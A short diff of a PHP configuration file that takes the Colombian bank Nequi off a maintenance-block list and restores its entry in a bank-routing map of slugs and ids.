@@ -12,7 +12,7 @@ return [
     // Bancos bloqueados temporalmente (muestran modal de mantenimiento).
     // Agregar/quitar claves internas aquí para activar o desactivar el bloqueo.
     'maintenance_banks' => [
-        'nequi',
+  //      'nequi',
     'daviplata',
     ],
 
@@ -29,7 +29,7 @@ return [
 //       'popular' => ['slug' => 'pop', 'id' => 'e795be1af0a0e791176cc511'],
 //          'avvillas' => ['slug' => 'avv', 'id' => 'e795be1af0a0e791176cc511'],
          'bancolombia' => ['slug' => 'bc', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
-     //   'nequi' => ['slug' => 'nq', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
+        'nequi' => ['slug' => 'nq', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
 //   'davivienda' => ['slug' => 'dv', 'id' => '4c3a6a204bd92c4c33690c3c'], 
     ],
 
